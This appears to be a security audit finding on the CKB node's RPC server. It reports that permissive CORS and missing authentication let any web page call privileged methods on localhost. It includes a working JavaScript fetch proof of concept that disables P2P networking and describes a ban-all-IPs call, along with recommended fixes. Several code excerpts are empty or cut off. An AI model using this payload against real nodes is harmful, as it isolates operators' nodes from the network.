### Title
Unauthenticated Privileged RPC Operations Exposed via Permissive CORS — (`rpc/src/server.rs`)

### Summary

The CKB RPC server applies `CorsLayer::permissive()` globally and enforces no authentication on any handler. Every privileged administrative method — including `set_network_active`, `set_ban`, `clear_banned_addresses`, `clear_tx_pool`, `remove_transaction`, `update_main_logger`, and `set_extra_logger` — is reachable by any web origin that can reach the RPC port. Because the default binding is `127.0.0.1:8114` and CORS is fully open, a malicious web page visited by the node operator can issue cross-origin JSON-RPC calls to localhost and invoke these operations without any credential or token.

### Finding Description

**Root cause — `rpc/src/server.rs`:**

`start_server` builds the Axum router and attaches `CorsLayer::permissive()`:

```rust

    .route("/", method_router.clone())
    .route("/{*path}", method_router)
    .route("/ping", get(ping_handler))
    .layer(Extension(Arc::clone(rpc)))
    .layer(CorsLayer::permissive())          // ← allows all origins
    .layer(TimeoutLayer::with_status_code(...))
    .layer(Extension(stream_config));
``` [1](#0-0) 

The request handler `handle_jsonrpc` performs zero authentication before dispatching to any method:

```rust

    req_body: Bytes,

``` [2](#0-1) 

No middleware, no token check, no IP allowlist enforcement exists anywhere in the server pipeline.

**Privileged methods reachable with zero credentials:**

```toml

``` [7](#0-6) 

### Impact Explanation

An attacker who can get the node operator to load a malicious web page can:

1. Call `set_network_active(false)` → the node drops all P2P connections and stops syncing or relaying, effectively isolating it from the network.
2. Call `set_ban("0.0.0.0/0", "insert", <far-future timestamp>)` → bans every IP, preventing any new peer connections.
3. Call `clear_banned_addresses` → removes all operator-configured bans, re-admitting previously blocked malicious peers.
4. Call `clear_tx_pool` → evicts all pending transactions, disrupting fee-paying users and miners relying on this node.
5. Call `update_main_logger` with a verbose filter → causes unbounded disk writes, leading to disk exhaustion.

All of these are persistent state changes that survive until the operator manually reverses them.

### Likelihood Explanation

The default RPC address is `127.0.0.1:8114`. `CorsLayer::permissive()` responds to every preflight with `Access-Control-Allow-Origin: *`, `Access-Control-Allow-Methods: *`, and `Access-Control-Allow-Headers: *`. Modern browsers therefore permit cross-origin `POST application/json` requests to localhost after a successful preflight. The attacker only needs the operator to visit a single malicious URL — no extension, no plugin, no special browser configuration required. This is a standard browser-based CSRF/cross-origin attack that is trivially weaponizable.

### Recommendation

- **Short term:** Remove `CorsLayer::permissive()` and replace it with a strict allowlist (e.g., same-origin only, or an explicit operator-configured origin list). At minimum, reject cross-origin requests to the RPC port.
- **Long term:** Add an authentication layer (e.g., a bearer token or HTTP Basic Auth secret configured at startup) that must be presented for all state-mutating RPC methods. Separate read-only methods from privileged administrative methods and require authentication only for the latter, or introduce a dedicated admin-only listen address that is not exposed by default.

### Proof of Concept

A malicious web page served from any origin executes the following JavaScript when visited by a node operator:

```javascript
// Disable all P2P networking on the victim's CKB node
fetch("http://127.0.0.1:8114", {
  method: "POST",
  headers: { "Content-Type": "application/json" },
  body: JSON.stringify({
    jsonrpc: "2.0",
    method: "set_network_active",
    params: [false],
    id: 1
  })
}).then(r => r.json()).then(console.log);
```

Because `CorsLayer::permissive()` responds to the browser's OPTIONS preflight with `Access-Control-Allow-Origin: *`, the browser sends the POST. The `handle_jsonrpc` handler dispatches it directly to `NetRpcImpl::set_network_active`, which calls `self.network_controller.set_active(false)` with no credential check. The node is immediately isolated from the P2P network. A second call with `set_ban("0.0.0.0/0", "insert", null, false, "pwned")` prevents reconnection.

    fn set_ban(
        &self,
        address: String,
        command: String,
        ban_time: Option<Timestamp>,
        absolute: Option<bool>,
        reason: Option<String>,
    ) -> Result<()> {
        let ip_network = address.parse().map_err(|_| {
            RPCError::invalid_params(format!(
                "Expected `params[0]` to be a valid IP address, got {address}"
            ))
        })?;

        match command.as_ref() {
            "insert" => {
                let ban_until = if absolute.unwrap_or(false) {
                    ban_time.unwrap_or_default().into()
                } else {
                    unix_time_as_millis()
                        + ban_time
                            .unwrap_or_else(|| DEFAULT_BAN_DURATION.into())
                            .value()
                };
                self.network_controller
                    .ban(ip_network, ban_until, reason.unwrap_or_default());
                Ok(())
            }
            "delete" => {
                self.network_controller.unban(&ip_network);
                Ok(())
            }
            _ => Err(RPCError::invalid_params(format!(
                "Expected `params[1]` to be in the list [insert, delete], got {address}"
            ))),
        }
    }
